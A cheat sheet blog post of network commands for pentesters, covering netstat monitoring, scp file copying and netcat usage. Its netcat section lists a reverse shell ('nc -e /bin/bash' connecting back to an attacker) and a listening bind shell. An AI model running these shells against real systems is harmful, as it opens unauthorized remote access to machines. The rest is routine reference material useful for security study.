---
title: "The Hacker's Cheat Sheet to Essential Network Commands"
date: "2024-11-03"
description: "A quick reference for vital network commands to elevate your security and pentesting skills."
tags: ["hackers", "network commands", "security tools"]
---

<h2 style="color: orange; text-align: center;">NETSTAT</h2>

### Basic Commands
```bash
- netstat -a                  # Show all connections and listening ports
- netstat -n                  # Display addresses/ports numerically
- netstat -b                  # Show executable involved (Windows admin)
- netstat -o                  # Display process IDs
```

### TCP Commands
```bash
- netstat -at                 # Displays all active TCP connections
- netstat -t                  # Shows TCP connections with state information
- netstat -atnp               # Lists all TCP connections with process IDs
- netstat -s -p tcp           # Displays TCP protocol-specific statistics
- netstat -lt                 # Shows listening TCP ports
```

### UDP Commands
```bash
- netstat -au                 # Displays all active UDP connections
- netstat -u                  # Shows UDP connections with state information
- netstat -aunp               # Lists all UDP connections with process IDs
- netstat -s -p udp           # Displays UDP protocol-specific statistics
- netstat -lu                 # Shows listening UDP ports
```

### Security Commands
```bash
- netstat -n                  # Displays numerical IP addresses, bypassing DNS resolution for security
- netstat -p                  # Shows the PID and name of the program to which each socket belongs
- netstat -e                  # Displays Ethernet statistics, useful for monitoring local network security
- netstat -g                  # Lists multicast group memberships for monitoring secure network communications
- netstat -antup              # Show all connections with processes
- netstat -tlpn | grep "LISTEN" | grep -v "127.0.0.1" # Find suspicious LISTENING ports
- netstat -ant | awk '{print $5}' | grep -v "^$" | cut -d: -f1 | sort | uniq -c | sort -nr | head -n 10 # Check for possible port scans
- netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n # Count connections per IP
- netstat -ant | awk '{print $6}' | sort | uniq -c # Monitor connection stats
```

### Real-time Monitoring
```bash
- netstat -ant 5              # Update every 5 seconds
- watch "netstat -an | grep ':80 '" # Watch specific port (80)
- watch -n1 'netstat -ant | grep -c ESTABLISHED' # Watch number of established connections
- watch -n1 'netstat -ant | grep -c SYN' # Watch number of SYN connections
```

### Statistics and Performance
```bash
  Interfacestats
- netstat -s                  # Protocol statistics
- netstat -i                  # Show interface statistics
- netstat --statistics --raw  # Display raw IP statistics
- netstat -m                  # Memory buffer usage

  Routing Information
- netstat -rn                 # Numeric routing table
- netstat -r                  # Show routing table
```
```bash
### Privileges
Many commands require root/administrator access. Use sudo on Linux/Unix systems and run as Administrator on Windows.

### Performance
The -n flag speeds up output by skipping DNS resolution. Continuous monitoring can be resource-intensive, so use grep/findstr for filtering large outputs.

### Cross-Platform
Replace grep with findstr on Windows, as some options are not available on all systems. Syntax may also vary between Unix distributions.

### Best Practices
Always use -n for scripts and combine with watch or task scheduler for monitoring. Additionally, pipe to text processing tools for complex analysis.

```

<h2 style="color: orange; text-align: center;">SCP</h2>


###  Commands
```bash
- scp file.txt user@192.168.1.1:/path/to/destination    # Copy file to remote host
- scp -r /local/directory user@192.168.1.1:/path/to/destination  # Copy directory to remote host
- scp -P 2222 file.txt user@192.168.1.1:/path/to/destination   # Copy file using a different port
```

### Options and Flags
```bash
- -P port      # Specify the port to connect to on the remote host
- -i keyfile   # Identity file for SSH authentication
- -v           # Verbose mode; for debugging and information
- -C           # Enable compression
- -q           # Quiet mode; suppresses the progress meter
- -o option    # Pass options to ssh in the form of key=value
```

### Copying from Local to Remote
```bash
- scp localfile.txt user@remote_host:/path/to/destination/ # Copy a file from local to remote
- scp -r local_directory user@remote_host:/path/to/destination/ # Copy a directory from local to remote
```

### Specifying Ports
```bash
- scp -P 2222 localfile.txt user@remote_host:/path/to/destination/ # Specify a custom port (e.g., 2222)
```

### Using Identity Files
```bash
- scp -i /path/to/private_key.pem localfile.txt user@remote_host:/path/to/destination/ # Use a specific SSH private key for authentication
```

### Advanced Options
```bash
- scp -C localfile.txt user@remote_host:/path/to/destination/ # Enable compression during transfer
- scp -v localfile.txt user@remote_host:/path/to/destination/ # Verbose mode for debugging
```

### Best Practices for Penetration Testers
```Bash
- Use `-C` to enable compression for faster transfers when dealing with large files.
- Use `-v` to enable verbose output to troubleshoot connection issues.
- Always ensure the integrity and confidentiality of files during transfer, especially when handling sensitive data.
- Use specific ports or identity files to align with organizational policies or for added security.
```


<h2 style="color: orange; text-align: center;">NETCAT</h2>

### Basic Commands
```bash
- nc -l -p <port>                   # Listen for incoming connections on the specified TCP port
- nc -u -l -p <port>                # Listen for incoming UDP packets on the specified port
- nc -v <hostname> <port>           # Connect to a specified host on a specified TCP port with verbose output
- nc -u -v <hostname> <port>        # Send/receive UDP packets to/from a specified host with verbose output
- nc -z -v <hostname> <port_range>  # Scan a range of ports to check for open connections
```

### Data Transfer
```bash
- nc -l -p <port> > received_file      # Receive data and save it to a file on a specified port
- nc <hostname> <port> < file_to_send  # Send a file to a remote host on a specified port
- nc -v -l -p <port> | tar xvf -       # Receive a tar file over TCP and extract it in real-time
```

### Reverse Shells (Use with Caution)
```bash
- nc -e /bin/bash <hostname> <port>  # Create a reverse shell to connect back to an attacker
- nc -l -p <port> -e /bin/bash       # Set up a listening shell that can be accessed remotely
```

### Advanced Features
```bash
- nc -n -v <hostname> <port>        # Connect to a host using numeric IP addresses only (no DNS resolution)
- nc -vv <hostname> <port>          # Connect with very verbose output for debugging
- nc -l -p <port> -s <IP>           # Listen on a specific IP address (useful for multi-homed systems)
- nc -w <timeout> <hostname> <port> # Set a timeout for the connection (in seconds)
```

### Options and Flags
```bash
- -l            # Listen mode (wait for incoming connections)
- -p <port>     # Specify the port to listen on or connect to
- -v            # Enable verbose output for debugging
- -u            # Enable UDP mode for sending and receiving packets
- -z            # Zero-I/O mode for scanning without sending data
- -n            # Numeric-only IP addresses (skip DNS resolution)
- -e <cmd>      # Execute a command after establishing a connection
- -w <timeout>  # Set a timeout for connects and sends (in seconds)
- -s <IP>       # Bind to a specific source IP address
```

<h2 style="color: orange; text-align: center;">NETCAT</h2>
